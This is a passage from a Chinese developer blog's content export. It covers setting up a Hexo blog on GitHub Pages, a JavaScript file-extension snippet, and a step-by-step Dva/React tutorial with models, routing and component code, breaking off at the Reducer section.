回顾一下我三年搭建博客的历程，最初是选择wordpress，Wordpress全部由php编写，数组库采用MySQL。优点：用户只需要将Wordpress的源代码复制到网站根目录下，然后访问网站，之后的安装操作全部在浏览器上完成。即使不是软件行业的人，也可以在几分钟之内完成安装工作。甚至很多虚拟主机供应商都提供了Wordpress的一键式安装工具。用户连上传文件的步骤都省了。缺点：项目太臃肿了，Wordpress耗损CPU严重，不容易操作，运行稍慢。尤其是后期文章数目较多的时候，想要登陆下网站的管理后台，心态简直是抓狂的。loading了好久，有时候还会失败，发一篇文章也很费劲，索性就不维护了。后来在github网站上找到一个vue模板：github地址和demo预览二次开发了一下，的确是实现了很多功能，也挺轻便的，样式也可以自定义，博客可以直接写在github的issue，很方便，用了三个月后才发现百度的搜索引擎居然只收录了首页，搜索引擎的基础爬虫的原理就是抓取你的url，然后获取你的html源代码并解析。 而你的页面通常用了vue等js的数据绑定机制来展示页面数据，爬虫获取到的html是你的模型页面而不是最终数据的渲染页面，所以说用js来渲染数据对seo并不友好。而且github api在国内访问速度也没有想象中那么快，可能是github的CDN被墙屏了。 使用github.io可以搭建一个自己的博客,把静态文件项目托管到github上,可以写博客,可以使用markdown语法,也可以展示作品.灵活性高.但是有较大的难度,但是这对于一个熟悉git操作的前端开发工程师来说，都不算什么的。重点是hexo和github.io的域名和服务器都是免费的。当然也可以选择用自己的服务器和域名。 Quick Start安装 node,git，注册好github账号 (网站有很多教程，安装方法这里就不详细展开了，注意:github账号用户名一定不能有大写.) 安装hexo: 1npm install -g hexo 创建hexo文件夹:cmd窗口切换到对应的目录下,然后执行: hexo init也可以在 E:\\hexo 下右键,选择git bash,在窗口中执行hexo init自动安装了需要的文件. 安装依赖:继续执行: npm install 完成本地安装:继续在 E:\\hexo 下执行: hexo generate 继续执行: hexo server 然后在打开浏览器 localhost:4000 ,就可以看到,本地已经安装好了. 在github上创建博客仓库: image 跳转的后如下填写:(其中Repository name的格式是 ‘用户名’.github.io ),然后点创建仓库，Repository name必须和用户名（Owner）一致，不能有大写字母 image image 创建SSH keys监测是否有已经存在的SSH keys:打开 git bash 终端(可以在 E:\\hexo 下右键打开,也可以直接在开始菜单里打开) 执行: $ ls -al ~/.ssh image 如果没有的话,就生成一个SSH keys: 写自己的邮箱$ ssh-keygen -t rsa -C &quot;your_email@example.com&quot; 然后会出现:12Generating public/private rsa key pair.Enter file in which to save the key (/Users/you/.ssh/id_rsa): 就是让你输入SSH keys要保存在哪里,一般不用改,就直接回车就好了.输入一个密码,这个密码后面会用到,所以要记住咯 保存SSH keys:创建成功后,他会提示你SSH keys保存在哪里:1234567Your identification has been saved in /Users/you/.ssh/id_rsa.# Your public key has been saved in /Users/you/.ssh/id_rsa.pub.# The key fingerprint is:# 01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db your_email@example.com 找到SSH keys:根据上一步里告诉你的路径,找到保存SSH keys的地方,我的是在 C:\\Users\\2000104591.ssh 其中 id_rsa.pub 就是SSH keys 如果为了防止以后找不到,可以把他们自己另存到其它地方 为github仓库添加SSH keys然后把创建的id_rsa.pub里的内容复制到Key里去,Title部分随便填. 点击’Add key’ 添加的过程中,还要再输入一次github的密码 image 配置_config.yml文件并发布:在 E:\\hexo(文件根目录下) 下,有一个文件叫 _config.yml ,打开它,拉到最底下,做如下修改: 然后再执行: hexo generate hexo deploy 然后访问: https://ye63.github.io/ (用户名改成自己的),就可以看到了. 快捷命令hexo 新建一篇文章给它添加分类和标签:1hexo new &quot;移动端限制input框只能输入数字&quot; 通过mou编辑器打开：添加tags和categories123456789---title: title #文章標題date: 2016-06-01 23:47:44 #文章生成時間categories: &quot;Hexo教程&quot; #文章分類目錄 可以省略tags: #文章标签 可以省略 - 标签1 - 标签2description: #你對本頁的描述 可以省略--- 发布1hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 创建新页面1hexo new page &quot;about&quot;","categories":[{"name":"Hexo教程","slug":"Hexo教程","permalink":"https://ru23.com/categories/Hexo教程/"}],"tags":[]},{"title":"Javascript截取文件名的后缀","slug":"2018-09-javascript截取文件名的后缀","date":"2018-09-06T11:22:37.000Z","updated":"2018-10-24T03:46:02.614Z","comments":true,"path":"note/3d134670.html","link":"","permalink":"https://ru23.com/note/3d134670.html","excerpt":"","text":"12345678const fileName=\"text.png\";//带.的格式let fileFormat=fileName.substring(fileName.lastIndexOf('.'))// 不带.的格式let fileFormat2=fileName.substring(fileName.lastIndexOf('.')+1);console.log(fileFormat,fileFormat2) image","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"js代码片段","slug":"js代码片段","permalink":"https://ru23.com/tags/js代码片段/"}]},{"title":"Dva实践总结","slug":"2018-09-dva","date":"2018-09-05T08:00:43.000Z","updated":"2018-10-24T03:46:02.608Z","comments":true,"path":"note/ac41d549.html","link":"","permalink":"https://ru23.com/note/ac41d549.html","excerpt":"","text":"一、环境搭建1234567$ npm install dva-cli -g# 创建应用$ dva new dva-quickstart# 启动$ npm start react项目的推荐目录结构（如果使用dva脚手架创建，则自动生成如下） 12345678910111213141516171819|── /mock/ # 数据mock的接口文件 |── /src/ # 项目源码目录（我们开发的主要工作区域） | |── /components/ # 项目组件（用于路由组件内引用的可复用组件） | |── /routes/ # 路由组件（页面维度） | | |── route1.js | | |── route2.js # 根据router.js中的映射，在不同的url下，挂载不同的路由组件| | └── route3.js | |── /models/ # 数据模型（可以理解为store，用于存储数据与方法） | | |── model1.js | | |── model2.js # 选择分离为多个model模型，是根据业务实体进行划分| | └── model3.js | |── /services/ # 数据接口（处理前台页面的ajax请求，转发到后台） | |── /utils/ # 工具函数（工具库，存储通用函数与配置参数） | |── router.js # 路由配置（定义路由与对应的路由组件） | |── index.js # 入口文件 | |── index.less | └── index.html |── package.json # 项目信息 └── proxy.config.js # 数据mock配置 使用 antd 1npm i babel-plugin-import --save babel-plugin-import 是用来按需加载 antd 的脚本和样式的 编辑 .webpackrc，使 babel-plugin-import 插件生效 12345&#123;+ \"extraBabelPlugins\": [+ [\"import\", &#123; \"libraryName\": \"antd\", \"libraryDirectory\": \"es\", \"style\": \"css\" &#125;]+ ]&#125; 二、初识Dva2.1 Dva的特性1dva = React-Router + Redux + Redux-saga 仅有 5 个API，仅有5个主要的api 支持 HMR，支持模块的热更新 支持 SSR (ServerSideRender)，支持服务器端渲染 支持 Mobile/ReactNative，支持移动手机端的代码编写 支持TypeScript 支持路由和 Model 的动态加载 2.2 Dva的五个API 2.2.1 app = dva(Opts) app = dva(Opts)：创建应用，返回 dva 实例。(注：dva 支持多实例)** 在opts可以配置所有的hooks 123456789101112const app = dva(&#123; history, initialState, onError, onAction, onStateChange, onReducer, onEffect, onHmr, extraReducers, extraEnhancers,&#125;); hooks包含如下配置项 1、 onError((err, dispatch) =&gt; {}) effect 执行错误或 subscription 通过done 主动抛错时触发，可用于管理全局出错状态 注意：subscription 并没有加 try...catch，所以有错误时需通过第二个参数 done 主动抛错 1234567app.model(&#123; subscriptions: &#123; setup(&#123; dispatch &#125;, done) &#123; done(e) &#125;, &#125;,&#125;) 2、 onAction(fn | fn[]) 在action被dispatch时触发，用于注册 redux 中间件。支持函数或函数数组格式 例如我们要通过 redux-logger 打印日志 1234import createLogger from 'redux-logger';const app = dva(&#123; onAction: createLogger(opts),&#125;) 3、 onStateChange(fn) state 改变时触发，可用于同步 state 到 localStorage，服务器端等 4、 onReducer(fn) 封装 reducer 执行，比如借助 redux-undo 实现 redo/undo 1234567891011import undoable from 'redux-undo';const app = dva(&#123; onReducer: reducer =&gt; &#123; return (state, action) =&gt; &#123; const undoOpts = &#123;&#125;; const newState = undoable(reducer, undoOpts)(state, action); // 由于 dva 同步了 routing 数据，所以需要把这部分还原 return &#123; ...newState, routing: newState.present.routing &#125;; &#125;, &#125;,&#125;) 5、 onEffect(fn) 封装 effect 执行。比如 dva-loading 基于此实现了自动处理 loading 状态 6、 onHmr(fn) 热替换相关，目前用于 babel-plugin-dva-hmr 7、 extraReducers 指定额外的 reducer，比如 redux-form 需要指定额外的 form reducer 123456import &#123; reducer as formReducer &#125; from 'redux-form'const app = dva(&#123; extraReducers: &#123; form: formReducer, &#125;,&#125;) 这里比较常用的是，history的配置，一般默认的是hashHistory，如果要配置 history为 browserHistory，可以这样 1234import createHistory from 'history/createBrowserHistory';const app = dva(&#123; history: createHistory(),&#125;); initialState：指定初始数据，优先级高于 model 中的 state，默认是 {}，但是基本上都在modal里面设置相应的state 2.2.2 app.use(Hooks) app.use(Hooks)：配置 hooks 或者注册插件 这里最常见的就是dva-loading插件的配置 123import createLoading from 'dva-loading';...app.use(createLoading(opts)); 但是一般对于全局的loading我们会根据业务的不同来显示相应不同的loading图标，我们可以根据自己的需要来选择注册相应的插件 2.2.3 app.model(ModelObject) app.model(ModelObject)：这个是你数据逻辑处理，数据流动的地方 2.2.4 app.unmodel(namespace) 取消 model 注册，清理 reducers,effects 和 subscriptions。subscription 如果没有返回 unlisten 函数，使用 app.unmodel 会给予警告 2.2.5 app.router(Function) 注册路由表，这一操作步骤在dva中也很重要 123456789101112131415161718// 注册路由app.router(require('./router'))// 路由文件import &#123; Router, Route &#125; from 'dva/router';import IndexPage from './routes/IndexPage'import TodoList from './routes/TodoList'function RouterConfig(&#123; history &#125;) &#123; return ( &lt;Router history=&#123;history&#125;&gt; &lt;Route path=\"/\" component=&#123;IndexPage&#125; /&gt; &lt;Route path='/todoList' components=&#123;TodoList&#125;/&gt; &lt;/Router&gt; )&#125;export default RouterConfig 如果我们想解决组件动态加载问题，我们的路由文件也可以按照下面的写法来写 1234567891011121314151617181920212223242526import &#123; Router, Switch, Route &#125; from 'dva/router'import dynamic from 'dva/dynamic'function RouterConfig(&#123; history, app &#125;) &#123; const IndexPage = dynamic(&#123; app, component: () =&gt; import('./routes/IndexPage'), &#125;) const Users = dynamic(&#123; app, models: () =&gt; [import('./models/users')], component: () =&gt; import('./routes/Users'), &#125;) return ( &lt;Router history=&#123;history&#125;&gt; &lt;Switch&gt; &lt;Route exact path=\"/\" component=&#123;IndexPage&#125; /&gt; &lt;Route exact path=\"/users\" component=&#123;Users&#125; /&gt; &lt;/Switch&gt; &lt;/Router&gt; )&#125;export default RouterConfig 其中dynamic(opts) 中opt包含三个配置项： app: dva 实例，加载 models 时需要 models: 返回 Promise 数组的函数，Promise返回 dva model` component：返回 Promise的函数，Promise返回 React Component 2.2.6 app.start 启动应用，即将我们的应用跑起来 2.3 Dva九个概念2.3.1 State 初始值，我们在 dva() 初始化的时候和在 modal 里面的 state 对其两处进行定义，其中 modal 中的优先级低于传给 dva() 的 opts.initialState 12345678910// dva()初始化const app = dva(&#123; initialState: &#123; count: 1 &#125;,&#125;);// modal()定义事件app.model(&#123; namespace: 'count', state: 0,&#125;); 2.3.2 Action 表示操作事件，可以是同步，也可以是异步 action 的格式如下，它需要有一个 type，表示这个 action 要触发什么操作；payload 则表示这个 action 将要传递的数据 1234&#123; type: String, payload: data,&#125; 我们通过 dispatch 方法来发送一个 action 1dispatch(&#123; type: &apos;todos/add&apos;, payload: &apos;Learn Dva&apos; &#125;); 其实我们可以构建一个Action 创建函数，如下 123456789function addTodo(text) &#123; return &#123; type: ADD_TODO, text &#125;&#125;//我们直接dispatch(addTodo()),就发送了一个action。dispatch(addTodo()) 2.3.3 Model model 是 dva 中最重要的概念，Model 非 MVC 中的 M，而是领域模型，用于把数据相关的逻辑聚合到一起，几乎所有的数据，逻辑都在这边进行处理分发 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import queryString from 'query-string'import * as todoService from '../services/todo'export default &#123; namespace: 'todo', state: &#123; list: [] &#125;, reducers: &#123; save(state, &#123; payload: &#123; list &#125; &#125;) &#123; return &#123; ...state, list &#125; &#125; &#125;, effects: &#123; *addTodo(&#123; payload: value &#125;, &#123; call, put, select &#125;) &#123; // 模拟网络请求 const data = yield call(todoService.query, value) console.log(data) let tempList = yield select(state =&gt; state.todo.list) let list = [] list = list.concat(tempList) const tempObj = &#123;&#125; tempObj.title = value tempObj.id = list.length tempObj.finished = false list.push(tempObj) yield put(&#123; type: 'save', payload: &#123; list &#125;&#125;) &#125;, *toggle(&#123; payload: index &#125;, &#123; call, put, select &#125;) &#123; // 模拟网络请求 const data = yield call(todoService.query, index) let tempList = yield select(state =&gt; state.todo.list) let list = [] list = list.concat(tempList) let obj = list[index] obj.finished = !obj.finished yield put(&#123; type: 'save', payload: &#123; list &#125; &#125;) &#125;, *delete(&#123; payload: index &#125;, &#123; call, put, select &#125;) &#123; const data = yield call(todoService.query, index) let tempList = yield select(state =&gt; state.todo.list) let list = [] list = list.concat(tempList) list.splice(index, 1) yield put(&#123; type: 'save', payload: &#123; list &#125; &#125;) &#125;, *modify(&#123; payload: &#123; value, index &#125; &#125;, &#123; call, put, select &#125;) &#123; const data = yield call(todoService.query, value) let tempList = yield select(state =&gt; state.todo.list) let list = [] list = list.concat(tempList) let obj = list[index] obj.title = value yield put(&#123; type: 'save', payload: &#123; list &#125; &#125;) &#125; &#125;, subscriptions: &#123; setup(&#123; dispatch, history &#125;) &#123; // 监听路由的变化，请求页面数据 return history.listen((&#123; pathname, search &#125;) =&gt; &#123; const query = queryString.parse(search) let list = [] if (pathname === 'todoList') &#123; dispatch(&#123; type: 'save', payload: &#123;list&#125; &#125;) &#125; &#125;) &#125; &#125;&#125; model对象中包含5个重要的属性 state 这里的 state 跟我们刚刚讲的 state 的概念是一样的，只不过她的优先级比初始化的低，但是基本上项目中的 state 都是在这里定义的 namespace model 的命名空间，同时也是他在全局 state 上的属性，只能用字符串，我们发送在发送 action 到相应的 reducer 时，就会需要用到 namespace Reducer 以key/value 格式定义 reducer，用于处理同步操作，唯一可以修改 state 的地方。由 action 触发。其实一个纯函数 12345678910namespace: 'todo', state: &#123; list: [] &#125;, // reducers 写法 reducers: &#123; save(state, &#123; payload: &#123; list &#125; &#125;) &#123; return &#123; ...state, list &#125; &#125; &#125; Effect 用于处理异步操作和业务逻辑，不直接修改 state，简单的来说，就是获取从服务端获取数据，并且发起一个 action交给reducer 的地方 其中它用到了redux-saga，里面有几个常用的函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// effects 写法effects: &#123; *addTodo(&#123; payload: value &#125;, &#123; call, put, select &#125;) &#123; // 模拟网络请求 const data = yield call(todoService.query, value) console.log(data) let tempList = yield select(state =&gt; state.todo.list) let list = [] list = list.concat(tempList) const tempObj = &#123;&#125; tempObj.title = value tempObj.id = list.length tempObj.finished = false list.push(tempObj) yield put(&#123; type: 'save', payload: &#123; list &#125;&#125;) &#125;, *toggle(&#123; payload: index &#125;, &#123; call, put, select &#125;) &#123; // 模拟网络请求 const data = yield call(todoService.query, index) let tempList = yield select(state =&gt; state.todo.list) let list = [] list = list.concat(tempList) let obj = list[index] obj.finished = !obj.finished yield put(&#123; type: 'save', payload: &#123; list &#125; &#125;) &#125;, *delete(&#123; payload: index &#125;, &#123; call, put, select &#125;) &#123; const data = yield call(todoService.query, index) let tempList = yield select(state =&gt; state.todo.list) let list = [] list = list.concat(tempList) list.splice(index, 1) yield put(&#123; type: 'save', payload: &#123; list &#125; &#125;) &#125;, *modify(&#123; payload: &#123; value, index &#125; &#125;, &#123; call, put, select &#125;) &#123; const data = yield call(todoService.query, value) let tempList = yield select(state =&gt; state.todo.list) let list = [] list = list.concat(tempList) let obj = list[index] obj.title = value yield put(&#123; type: 'save', payload: &#123; list &#125; &#125;) &#125;&#125; 在项目中最主要的会用到的是 put 与 call Subscription 以 key/value 格式定义 subscription，subscription 是订阅，用于订阅一个数据源，然后根据需要 dispatch 相应的 action subscription 是订阅，用于订阅一个数据源，然后根据需要 dispatch 相应的action。在 app.start() 时被执行，数据源可以是当前的时间、当前页面的url、服务器的 websocket 连接、history路由变化等等。 注意：如果要使用 app.unmodel()，subscription 必须返回 unlisten 方法，用于取消数据订阅 12345678910111213// subscriptions 写法subscriptions: &#123; setup(&#123; dispatch, history &#125;) &#123; // 监听路由的变化，请求页面数据 return history.listen((&#123; pathname, search &#125;) =&gt; &#123; const query = queryString.parse(search) let list = [] if (pathname === 'todoList') &#123; dispatch(&#123; type: 'save', payload: &#123;list&#125; &#125;) &#125; &#125;) &#125; &#125; 2.3.4 Router Router 表示路由配置信息，项目中的 router.js 1234567export default function(&#123; history &#125;)&#123; return( &lt;Router history=&#123;history&#125;&gt; &lt;Route path=\"/\" component=&#123;App&#125; /&gt; &lt;/Router&gt; );&#125; RouteComponent RouteComponent 表示Router 里匹配路径的 Component，通常会绑定model的数据。如下: 1234567891011import &#123; connect &#125; from 'dva';function App() &#123; return &lt;div&gt;App&lt;/div&gt;;&#125;function mapStateToProps(state) &#123; return &#123; todos: state.todos &#125;;&#125;export default connect(mapStateToProps)(App); 2.4 整体架构 首先我们根据 url 访问相关的 Route-Component，在组件中我们通过 dispatch发送 action 到 model 里面的 effect 或者直接 Reducer 当我们将action发送给Effect，基本上是取服务器上面请求数据的，服务器返回数据之后，effect 会发送相应的 action给 reducer，由唯一能改变 state的 reducer 改变 state ，然后通过connect重新渲染组件。 当我们将action发送给reducer，那直接由 reducer 改变 state，然后通过connect重新渲染组件 2.5 Dva图解图解一：加入Saga React 只负责页面渲染, 而不负责页面逻辑, 页面逻辑可以从中单独抽取出来, 变成 store 使用 Middleware 拦截 action, 这样一来异步的网络操作也就很方便了, 做成一个 Middleware就行了, 这里使用redux-saga 这个类库 点击创建 Todo的按钮, 发起一个 type == addTodo 的 action saga 拦截这个 action, 发起 http 请求, 如果请求成功, 则继续向 reducer 发一个 type == addTodoSucc 的 action, 提示创建成功, 反之则发送 type == addTodoFail 的action 即可 图解二：Dva表示法 dva做了 3 件很重要的事情 把 store及 saga 统一为一个 model 的概念, 写在一个 js 文件里面 增加了一个 Subscriptions, 用于收集其他来源的 action, eg: 键盘操作 model 写法很简约, 类似于 DSL 或者 RoR 三、计数器例子1$ dva new myapp 目录结构介绍 123456789101112131415161718192021.├── mock // mock数据文件夹├── node_modules // 第三方的依赖├── public // 存放公共public文件的文件夹├── src // 最重要的文件夹，编写代码都在这个文件夹下│ ├── assets // 可以放图片等公共资源│ ├── components // 就是react中的木偶组件│ ├── models // dva最重要的文件夹，所有的数据交互及逻辑都写在这里│ ├── routes // 就是react中的智能组件，不要被文件夹名字误导。│ ├── services // 放请求借口方法的文件夹│ ├── utils // 自己的工具方法可以放在这边│ ├── index.css // 入口文件样式│ ├── index.ejs // ejs模板引擎│ ├── index.js // 入口文件│ └── router.js // 项目的路由文件├── .eslintrc // bower安装目录的配置├── .editorconfig // 保证代码在不同编辑器可视化的工具├── .gitignore // git上传时忽略的文件├── .roadhogrc.js // 项目的配置文件，配置接口转发，css_module等都在这边。├── .roadhogrc.mock.js // 项目的配置文件└── package.json // 当前整一个项目的依赖 首先是前端的页面，我们使用 class 形式来创建组件，原例子中是使用无状态来创建的。react 创建组件的各种方式，大家可以看React创建组件的三种方式及其区别 我们先修改route/IndexPage.js 123456789101112131415161718192021import React from 'react';import &#123; connect &#125; from 'dva';import styles from './IndexPage.css';class IndexPage extends React.Component &#123; render() &#123; const &#123; dispatch &#125; = this.props; return ( &lt;div className=&#123;styles.normal&#125;&gt; &lt;div className=&#123;styles.record&#125;&gt;Highest Record: 1&lt;/div&gt; &lt;div className=&#123;styles.current&#125;&gt;2&lt;/div&gt; &lt;div className=&#123;styles.button&#125;&gt; &lt;button onClick=&#123;() =&gt; &#123;&#125;&#125;&gt;+&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; ); &#125;&#125;export default connect()(IndexPage); 同时修改样式routes/IndexPage.css 1234567891011121314151617181920212223242526.normal &#123; width: 200px; margin: 100px auto; padding: 20px; border: 1px solid #ccc; box-shadow: 0 0 20px #ccc;&#125;.record &#123; border-bottom: 1px solid #ccc; padding-bottom: 8px; color: #ccc;&#125;.current &#123; text-align: center; font-size: 40px; padding: 40px 0;&#125;.button &#123; text-align: center; button &#123; width: 100px; height: 40px; background: #aaa; color: #fff; &#125;&#125; 在 model 处理state，在页面里面输出 model 中的 state 首先我们在index.js中将models/example.js，即将model下一行的的注释打开 1234567891011121314151617import dva from 'dva';import './index.css';// 1. Initializeconst app = dva();// 2. Plugins// app.use(&#123;&#125;);// 3. Modelapp.model(require('./models/example')); // 打开注释// 4. Routerapp.router(require('./router'));// 5. Startapp.start('#root'); 接下来我们进入 models/example.js，将namespace 名字改为 count，state对象加上 record 与 current 属性。如下 12345678export default &#123; namespace: 'count', state: &#123; record: 0, current: 0, &#125;, ...&#125;; 接着我们来到 routes/indexpage.js 页面，通过的 mapStateToProps引入相关的 state 12345678910111213141516171819202122232425262728293031import React from 'react';import &#123; connect &#125; from 'dva';import styles from './IndexPage.css';class IndexPage extends React.Component &#123; render() &#123; const &#123; dispatch, count &#125; = this.props; return ( &lt;div className=&#123;styles.normal&#125;&gt; &lt;div className=&#123;styles.record&#125;&gt; Highest Record: &#123;count.record&#125; // 将count的record输出 &lt;/div&gt; &lt;div className=&#123;styles.current&#125;&gt; &#123;count.current&#125; &lt;/div&gt; &lt;div className=&#123;styles.button&#125;&gt; &lt;button onClick=&#123;() =&gt; &#123;&#125; &#125; &gt; + &lt;/button&gt; &lt;/div&gt; &lt;/div&gt; ); &#125;&#125;function mapStateToProps(state) &#123; return &#123; count: state.count &#125;;&#125; // 获取stateexport default connect(mapStateToProps)(IndexPage); 通过 + 发送 action，通过 reducer 改变相应的 state 首先我们在 models/example.js，写相应的 reducer 123456789101112131415export default &#123; ... reducers: &#123; add1(state) &#123; const newCurrent = state.current + 1; return &#123; ...state, record: newCurrent &gt; state.record ? newCurrent : state.record, current: newCurrent, &#125;; &#125;, minus(state) &#123; return &#123; ...state, current: state.current - 1 &#125;; &#125;, &#125;,&#125;; 在页面的模板 routes/IndexPage.js 中 + 号点击的时候，dispatch一个 action 12345678910111213141516171819202122232425import React from 'react';import &#123; connect &#125; from 'dva';import styles from './IndexPage.css';class IndexPage extends React.Component &#123; render() &#123; const &#123; dispatch, count &#125; = this.props; return ( &lt;div className=&#123;styles.normal&#125;&gt; &lt;div className=&#123;styles.record&#125;&gt;Highest Record: &#123;count.record&#125;&lt;/div&gt; &lt;div className=&#123;styles.current&#125;&gt;&#123;count.current&#125;&lt;/div&gt; &lt;div className=&#123;styles.button&#125;&gt; &lt;button + onClick=&#123;() =&gt; &#123; dispatch(&#123; type: 'count/add1' &#125;);&#125; &#125;&gt;+&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; ); &#125;&#125;function mapStateToProps(state) &#123; return &#123; count: state.count &#125;;&#125;export default connect(mapStateToProps)(IndexPage); 接下来我们来使用 effect 模拟一个数据接口请求，返回之后，通过 yield put() 改变相应的 state 首先我们替换相应的 models/example.js 的 effect 123456effects: &#123; *add(action, &#123; call, put &#125;) &#123; yield call(delay, 1000); yield put(&#123; type: 'minus' &#125;); &#125;,&#125;, 这里的 delay，是我这边写的一个延时的函数，我们在 utils 里面编写一个 utils.js ，一般请求接口的函数都会写在 servers 文件夹中 12345export function delay(timeout) &#123; return new Promise((resolve) =&gt; &#123; setTimeout(resolve, timeout); &#125;);&#125; 订阅订阅键盘事件，使用 subscriptions，当用户按住 command+up 时候触发添加数字的 action 在 models/example.js 中作如下修改 12345678910+import key from 'keymaster';...app.model(&#123; namespace: 'count',+ subscriptions: &#123;+ keyboardWatcher(&#123; dispatch &#125;) &#123;+ key('⌘+up, ctrl+up', () =&gt; &#123; dispatch(&#123;type:'add'&#125;) &#125;);+ &#125;,+ &#125;,&#125;); 在这里你需要安装 keymaster 这个依赖 1npm install keymaster --save 现在你可以按住 command+up 就可以使 current 加1 四、Dva实践4.1 抽离Model 抽离Model，根据设计页面需求，设计相应的Model 1234567891011121314151617181920212223242526272829303132333435// models/users.js// version1: 从数据维度抽取，更适用于无状态的数据// version2: 从业务状态抽取，将数据与组件的业务状态统一抽离成一个model// 新增部分为在数据维度基础上，改为从业务状态抽取而添加的代码export default &#123; namespace: 'users', state: &#123; list: [], total: null,+ loading: false, // 控制加载状态+ current: null, // 当前分页信息+ currentItem: &#123;&#125;, // 当前操作的用户对象+ modalVisible: false, // 弹出窗的显示状态+ modalType: 'create', // 弹出窗的类型（添加用户，编辑用户） &#125;, // 异步操作 effects: &#123; *query()&#123;&#125;, *create()&#123;&#125;, *'delete'()&#123;&#125;, // 因为delete是关键字，特殊处理 *update()&#123;&#125;, &#125;, // 替换状态树 reducers: &#123;+ showLoading()&#123;&#125;, // 控制加载状态的 reducer+ showModel()&#123;&#125;, // 控制 Model 显示状态的 reducer+ hideModel()&#123;&#125;, querySuccess()&#123;&#125;, createSuccess()&#123;&#125;, deleteSuccess()&#123;&#125;, updateSuccess()&#123;&#125;, &#125;&#125; 4.2 设计组件 先设置容器组件的访问路径，再创建组件文件 4.2.1 容器组件 具有监听数据行为的组件，职责是绑定相关联的 model 数据，包含子组件；传入的数据来源于model 123456789101112131415161718192021import React, &#123; Component, PropTypes &#125; from 'react';// dva 的 connect 方法可以将组件和数据关联在一起import &#123; connect &#125; from 'dva';// 组件本身const MyComponent = (props)=&gt;&#123;&#125;;// propTypes属性，用于限制props的传入数据类型MyComponent.propTypes = &#123;&#125;;// 声明模型传递函数，用于建立组件和数据的映射关系// 实际表示 将ModelA这一个数据模型，绑定到当前的组件中，则在当前组件中，随时可以取到ModelA的最新值// 可以绑定多个Modelfunction mapStateToProps(&#123;ModelA&#125;) &#123; return &#123;ModelA&#125;;&#125;// 关联 model// 正式调用模型传递函数，完成模型绑定export default connect(mapStateToProps)(MyComponent); 4.2.2 展示组件 展示通过 props 传递到组件内部数据；传入的数据来源于容器组件向展示组件的props 123456789import React, &#123; Component, PropTypes &#125; from 'react';// 组件本身// 所需要的数据通过 Container Component 通过 props 传递下来const MyComponent = (props)=&gt;&#123;&#125;MyComponent.propTypes = &#123;&#125;;// 并不会监听数据export default MyComponent; 4.2.3 设置路由123456789101112// .src/router.jsimport React, &#123; PropTypes &#125; from 'react';import &#123; Router, Route &#125; from 'dva/router';import Users from './routes/Users';export default function(&#123; history &#125;) &#123; return ( &lt;Router history=&#123;history&#125;&gt; &lt;Route path=\"/users\" component=&#123;Users&#125; /&gt; &lt;/Router&gt; );&#125;; 容器组件雏形 12345678910// .src/routes/Users.jsximport React, &#123; PropTypes &#125; from 'react';function Users() &#123; return ( &lt;div&gt;User Router Component&lt;/div&gt; );&#125;export default Users; 4.2.4 设计容器组件 自顶向下的设计方法：先设计容器组件，再逐步细化内部的展示容器 组件的定义方式 12345678// 方法一： es6 的写法，当组件设计react生命周期时，可采用这种写法// 具有生命周期的组件，可以在接收到传入数据变化时，自定义执行方法，有自己的行为模式// 比如在组件生成后调用xx请求(componentDidMount)、可以自己决定要不要更新渲染(shouldComponentUpdate)等class App extends React.Component(&#123;&#125;);// 方法二： stateless 的写法，定义无状态组件// 无状态组件，仅仅根据传入的数据更新，修改自己的渲染内容const App = (props) =&gt; (&#123;&#125;); 容器组件： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// ./src/routes/Users.jsximport React, &#123; Component, PropTypes &#125; from 'react';// 引入展示组件 （暂时都没实现）import UserList from '../components/Users/UserList';import UserSearch from '../components/Users/UserSearch';import UserModal from '../components/Users/UserModal';// 引入css样式表import styles from './style.less'function Users() &#123; // 向userListProps中传入静态数据 const userSearchProps = &#123;&#125;; const userListProps = &#123; total: 3, current: 1, loading: false, dataSource: [ &#123; name: '张三', age: 23, address: '成都', &#125;, &#123; name: '李四', age: 24, address: '杭州', &#125;, &#123; name: '王五', age: 25, address: '上海', &#125;, ], &#125;; const userModalProps = &#123;&#125;; return ( &lt;div className=&#123;styles.normal&#125;&gt; &#123;/* 用户筛选搜索框 */&#125; &lt;UserSearch &#123;...userSearchProps&#125; /&gt; &#123;/* 用户信息展示列表 */&#125; &lt;UserList &#123;...userListProps&#125; /&gt; &#123;/* 添加用户 &amp; 修改用户弹出的浮层 */&#125; &lt;UserModal &#123;...userModalProps&#125; /&gt; &lt;/div&gt; );&#125;// 很关键的对外输出export；使外部可通过import引用使用此组件export default Users; 展示组件UserList 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// ./src/components/Users/UserList.jsximport React, &#123; Component, PropTypes &#125; from 'react';// 采用antd的UI组件import &#123; Table, message, Popconfirm &#125; from 'antd';// 采用 stateless 的写法const UserList = (&#123; total, current, loading, dataSource,&#125;) =&gt; &#123; const columns = [&#123; title: '姓名', dataIndex: 'name', key: 'name', render: (text) =&gt; &lt;a href=\"#\"&gt;&#123;text&#125;&lt;/a&gt;, &#125;, &#123; title: '年龄', dataIndex: 'age', key: 'age', &#125;, &#123; title: '住址', dataIndex: 'address', key: 'address', &#125;, &#123; title: '操作', key: 'operation', render: (text, record) =&gt; ( &lt;p&gt; &lt;a onClick=&#123;()=&gt;&#123;&#125;&#125;&gt;编辑&lt;/a&gt; &lt;Popconfirm title=\"确定要删除吗？\" onConfirm=&#123;()=&gt;&#123;&#125;&#125;&gt; &lt;a&gt;删除&lt;/a&gt; &lt;/Popconfirm&gt; &lt;/p&gt; ), &#125;]; // 定义分页对象 const pagination = &#123; total, current, pageSize: 10, onChange: ()=&gt;&#123;&#125;, &#125;; // 此处的Table标签使用了antd组件，传入的参数格式是由antd组件库本身决定的 // 此外还需要在index.js中引入antd import 'antd/dist/antd.css' return ( &lt;div&gt; &lt;Table columns=&#123;columns&#125; dataSource=&#123;dataSource&#125; loading=&#123;loading&#125; rowKey=&#123;record =&gt; record.id&#125; pagination=&#123;pagination&#125; /&gt; &lt;/div&gt; );&#125;export default UserList; 4.3 添加Reducer 